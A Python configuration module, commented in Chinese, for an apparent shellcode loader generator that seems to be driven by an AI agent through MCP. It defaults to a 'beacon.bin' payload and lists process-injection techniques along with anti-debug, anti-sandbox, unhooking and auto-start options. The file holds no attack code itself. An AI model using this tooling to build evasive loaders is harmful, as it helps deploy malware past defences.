"""
配置管理模块：定义 LoaderConfig 数据类，集中管理所有生成参数。
"""
from dataclasses import dataclass, field
from typing import Optional, List
import re


@dataclass
class LoaderConfig:
    """Shellcode 加载器生成配置"""
    # Shellcode 相关
    shellcode_path: str = "beacon.bin"
    encrypt_shellcode: bool = False
    encryption_key: Optional[str] = None
    arch: str = "x64"
    
    # 加载方式
    load_method: str = "Dynamic Load"
    sacrificial_dll: str = "C:\\Windows\\System32\\combase.dll"
    use_process_hollowing: bool = False
    
    # 调试与解析
    enable_debug: bool = False
    use_dynamic_resolve: bool = False
    
    # 反检测
    anti_debug: bool = False
    anti_sandbox: bool = False
    
    # 自启动
    auto_start: bool = False
    
    # 环境准备
    enable_unhook: bool = False
    enable_anti_detection: bool = False
    
    # 内部计算字段（自动生成）
    supported_methods: List[str] = field(default_factory=list, init=False)
    
    def __post_init__(self):
        """初始化后验证参数并计算派生字段"""
        self._validate()
        self._compute_supported_methods()
    
    def _validate(self):
        """验证配置参数"""
        if self.arch not in ("x86", "x64"):
            raise ValueError(f"架构必须为 x86 或 x64，当前为 {self.arch}")
        
        if self.encrypt_shellcode and not self.encryption_key:
            raise ValueError("启用解密时必须提供 encryption_key")
        
        if self.encryption_key and not isinstance(self.encryption_key, str):
            raise ValueError("encryption_key 必须是字符串")
        
        # 检查 sacrificial_dll 路径格式（暂时禁用，因为正则有问题）
        # if not re.match(r'^[a-zA-Z]:', self.sacrificial_dll):
        #     raise ValueError(f"sacrificial_dll 必须是绝对路径，当前为 {self.sacrificial_dll}")
    
    def _compute_supported_methods(self):
        """根据架构计算支持的加载方式列表"""
        if self.arch == "x86":
            # 32位支持的加载方式
            base_methods = [
                "CreateThreadpoolWait Load", "Fiber Load", "NtTestAlert Load",
                "SEH Except Load", "TLS CallBack Load", "Dynamic Load",
                "Dynamic Load plus", "Syscall Load", "APC-Inject Load",
                "Early Brid APC-Inject Load", "NtCreateSection-Inject Load",
                "OEP Hiijack-Inject Load", "Thread Hiijack-Inject Load",
                "Module Stomp"
            ]
        else:  # x64
            # 64位支持的加载方式
            base_methods = [
                "CreateThreadpoolWait Load", "Fiber Load", "NtTestAlert Load",
                "SEH Except Load", "TLS CallBack Load", "Dynamic Load",
                "Dynamic Load plus", "Syscall Load", "APC-Inject Load",
                "Early Brid APC-Inject Load", "NtCreateSection-Inject Load",
                "OEP Hiijack-Inject Load", "Thread Hiijack-Inject Load",
                "Module Stomp"
            ]
        
        self.supported_methods = base_methods
    
    def is_method_supported(self, method: str) -> bool:
        """检查加载方式是否支持"""
        return method in self.supported_methods
    
    def to_dict(self) -> dict:
        """转换为字典，用于模板渲染"""
        return {
            "shellcode_path": self.shellcode_path,
            "encrypt_shellcode": self.encrypt_shellcode,
            "encryption_key": self.encryption_key,
            "arch": self.arch,
            "load_method": self.load_method,
            "sacrificial_dll": self.sacrificial_dll,
            "use_process_hollowing": self.use_process_hollowing,
            "enable_debug": self.enable_debug,
            "use_dynamic_resolve": self.use_dynamic_resolve,
            "anti_debug": self.anti_debug,
            "anti_sandbox": self.anti_sandbox,
            "auto_start": self.auto_start,
            "enable_unhook": self.enable_unhook,
            "enable_anti_detection": self.enable_anti_detection,
            "supported_methods": self.supported_methods,
        }
    
    @classmethod
    def from_mcp_params(cls, **kwargs) -> "LoaderConfig":
        """从 MCP 工具函数参数创建配置实例"""
        # 过滤掉 None 值，使用默认值
        filtered = {k: v for k, v in kwargs.items() if v is not None}
        return cls(**filtered)


# 全局配置实例（可选）
_current_config: Optional[LoaderConfig] = None


def get_global_config() -> Optional[LoaderConfig]:
    """获取全局配置实例"""
    return _current_config


def set_global_config(config: LoaderConfig):
    """设置全局配置实例"""
    global _current_config
    _current_config = config